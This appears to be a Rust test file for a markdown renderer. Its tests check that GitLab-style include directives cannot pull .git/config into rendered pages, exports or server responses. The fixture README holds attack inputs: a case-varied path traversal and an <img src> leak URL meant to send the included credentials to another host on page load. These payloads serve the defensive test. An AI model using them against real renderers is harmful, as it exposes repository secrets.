//! `::include{file=...}` never reads `.git` (SEC-3 / GL-INC-1, DESIGN D14): neither through
//! the live server, nor `md-render export`, nor the raw-HTML attribute trick that would make a
//! browser send the included text to another host as soon as the page loads.

mod server_support;

use std::path::Path;
use std::sync::Arc;

use md_render::flavor::{Flavor, Mode, ThemeSel};
use md_render::page::Layout;
use md_render::render::{OfflineRenderer, RenderOptions};
use server_support::Fixture;

const SECRET: &str = "FAKE-SECRET-123";
const GIT_CONFIG: &str =
    "[remote \"origin\"]\n\turl = https://alice:FAKE-SECRET-123@git.example.com/r.git\n";

/// Includes `.git/config` plainly, through `x/../`, in another letter case, and inside an
/// `<img src>` that a type-1 HTML block (`<pre>`) keeps together across the included lines.
const README: &str = "# Project\n\n\
::include{file=.git/config}\n\n\
::include{file=docs/../.GIT/config}\n\n\
<pre><img src='http://127.0.0.1:9/leak?c=\n::include{file=.git/config}\n&p=\n::include{file=docs/part.md}\n'></pre>\n";

fn write_repo(root: &Path) {
    server_support::write(&root.join("README.md"), README);
    server_support::write(&root.join(".git/config"), GIT_CONFIG);
    server_support::write(&root.join("docs/part.md"), "PART-OK");
}

fn assert_no_secret(what: &str, html: &str) {
    assert!(!html.contains(SECRET), "{what} leaked .git/config:\n{html}");
    assert!(
        html.contains("Error including"),
        "{what}: expected GitLab's include error:\n{html}"
    );
    assert!(
        html.contains("PART-OK"),
        "{what}: ordinary includes still work:\n{html}"
    );
}

#[test]
fn renderer_does_not_include_git_dir() {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().canonicalize().unwrap();
    write_repo(&root);
    let mut opts = RenderOptions::new(Flavor::Gitlab);
    opts.source_path = Some(root.join("README.md"));
    opts.root = Some(root.clone());
    opts.sourcepos = false;
    let r = md_render::render::render(README, &opts);
    assert_no_secret("render", &r.html);
    assert_eq!(
        r.html
            .matches("<strong>Error including '<a href=\".git/config\">.git/config</a>': not found</strong>")
            .count(),
        1,
        "{}",
        r.html
    );
    assert!(
        r.warnings.iter().any(|w| w.contains("not found")),
        "{:?}",
        r.warnings
    );
    assert!(
        md_render::render::gitlab::included_files(README, &opts)
            .iter()
            .all(|p| !p.to_string_lossy().contains(".git")),
        ".git must not be watched either"
    );
}

#[test]
fn export_does_not_include_git_dir() {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().canonicalize().unwrap();
    write_repo(&root);
    let out = root.join("out.html");
    let cfg = md_render::export::ExportConfig {
        input: md_render::export::ExportInput::File(root.join("README.md")),
        output: md_render::export::ExportOutput::File(out.clone()),
        inline: true,
        flavor: Flavor::Gitlab,
        mode: Mode::Readme,
        theme: ThemeSel::default(),
        layout: Layout::Readme,
        title: None,
        context: None,
        bundle_path: root.join("missing-styles.tar.gz"),
        renderer: Arc::new(OfflineRenderer),
        quiet: true,
    };
    md_render::export::export(&cfg).expect("export");
    assert_no_secret("export", &std::fs::read_to_string(&out).unwrap());
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn server_does_not_include_git_dir() {
    let f = Fixture::new();
    write_repo(&f.root);
    let s = f
        .start(|cfg| {
            cfg.flavor = Flavor::Gitlab;
            cfg.renderer = Arc::new(OfflineRenderer);
        })
        .await;
    for target in ["/", "/README.md", "/__/md-render/render?path=README.md"] {
        let r = s.get(target).await;
        assert_eq!(r.status, 200, "{target}: {}", r.text());
        assert_no_secret(target, &r.text());
    }
    // The file itself stays forbidden, as before.
    assert_eq!(s.get("/.git/config").await.status, 403);
}
